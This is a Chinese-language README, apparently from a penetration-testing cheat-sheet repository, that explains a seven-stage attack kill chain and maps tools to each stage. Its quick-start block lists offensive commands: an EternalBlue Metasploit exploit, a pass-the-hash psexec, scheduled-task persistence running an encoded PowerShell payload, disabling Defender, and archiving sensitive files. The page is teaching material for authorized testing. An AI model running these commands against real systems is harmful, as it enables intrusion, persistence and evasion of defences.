# 🎯 攻击方法论：攻击链（Kill Chain）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](./README.it.md) • [🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 什么是攻击链？

**攻击链（Attack Kill Chain）**描述攻击者入侵并利用目标系统或网络时经历的阶段。原文将其与 **Cyber Kill Chain**、**MITRE ATT&CK** 并列提及；三者的区别见下方译注。

> **译注（概念）：** 本文七阶段流程是便于学习的组织方式。MITRE ATT&CK 是基于真实观察的战术与技术知识库，并非 Cyber Kill Chain 的同义词；本图也不是其完整战术矩阵。参见 [MITRE ATT&CK 官方说明](https://attack.mitre.org/)。图中的阶段名称与下方指南逐项对应。

> **示例说明：** 快速入门代码块混用了 Metasploit、Windows 命令及 PowerShell，不能作为单个 Bash 脚本执行。`IEX(payload)`、`HASH` 等是原文占位写法；最后的 `Compress-Archive` 只负责归档，还没有传输数据。

---

## 📊 攻击链阶段

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           攻击生命周期                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. 初始      │───▶│ 2. 发现      │───▶│ 3. 权限              │        │
│   │    访问      │    │ 与枚举       │    │    提升              │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. 横向              │          │
│          │                               │    移动              │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. 达成      │◀───│ 6. 防御      │◀───│ 5. 持久化            │        │
│   │ 攻击目标     │    │    规避      │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 各阶段指南

| 阶段 | 说明 | 指南 |
|-------|-------------|-------|
| **1. 初始访问** | 在目标中取得初始立足点 | [📄 查看](./01-Initial-Access.zh-CN.md) |
| **2. 发现与枚举** | 收集已入侵系统的信息 | [📄 查看](./02-Enumeration.zh-CN.md) |
| **3. 权限提升** | 将权限提升至管理员/root | [📄 查看](./03-Privilege-Escalation.zh-CN.md) |
| **4. 横向移动** | 在网络内移动到其他系统 | [📄 查看](./04-Lateral-Movement.zh-CN.md) |
| **5. 持久化** | 在重启或活动被发现后保持访问 | [📄 查看](./05-Persistence.zh-CN.md) |
| **6. 防御规避** | 绕过 AV、EDR 及安全控制 | [📄 查看](./06-Defense-Evasion.zh-CN.md) |
| **7. 达成攻击目标** | 实现最终目标（数据外传或造成影响） | [📄 查看](./07-Actions-Objectives.zh-CN.md) |

---

## 🔗 相关速查表

### 按阶段分类

| 阶段 | 相关工具 |
|-------|---------------|
| 初始访问 | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| 枚举 | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| 权限提升 | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| 横向移动 | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| 持久化 | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| 防御规避 | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| 数据外传（Exfiltration） | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 快速入门

### 典型攻击流程
```bash
# 1. 初始访问：利用漏洞
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. 枚举：发现可以访问的资源
whoami /all
systeminfo
net user

# 3. 权限提升：获取 SYSTEM/root
.\winPEAS.exe

# 4. 横向移动：转向其他系统
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. 持久化：保持访问
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. 防御规避：禁用杀毒软件
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. 达成攻击目标：外传数据
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 参考资源

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 沿着攻击链开展测试！</b><br>
  <i>仅用于获得授权的渗透测试！</i>
</p>
